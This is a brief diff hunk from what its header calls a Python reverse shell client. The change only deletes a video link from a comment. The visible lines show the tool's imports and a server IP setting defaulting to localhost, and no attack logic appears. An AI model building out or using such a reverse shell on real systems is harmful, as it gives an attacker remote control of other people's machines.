@@ -4,7 +4,7 @@
 #   **python reverse shell**
 # coded by: oseid Aldary
 ##############################
-#Client_FILE https://youtu.be/KpSh7DOICd4?list=PLnQp8N-IrjouH2p6wNBclVfmu7eqZNEhN&t=878
+#Client_FILE
 import struct,socket,subprocess,os,platform,webbrowser as browser
 # server_config
 IP = "localhost" # Your server IP, default: localhost
